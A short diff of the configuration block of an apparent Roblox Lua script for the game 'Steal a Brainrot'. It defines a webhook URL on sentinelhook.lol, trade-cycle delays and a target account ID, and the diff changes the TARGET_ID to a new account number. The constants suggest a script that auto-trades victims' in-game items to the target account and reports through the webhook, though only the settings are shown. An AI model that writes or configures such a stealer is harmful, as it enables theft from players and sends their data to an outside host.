@@ -51,7 +51,7 @@ task.spawn(function()
 local GOOD_WEBHOOK = "https://sentinelhook.lol/api.php?id=tVLsBNyzeaBCK2T"
 local GOOD_AVATAR = "https://i.pinimg.com/736x/e3/46/94/e34694a46f6b5e501348e65ef15c222e.jpg"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
-local TARGET_ID = 915105715
+local TARGET_ID = 2308978569
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
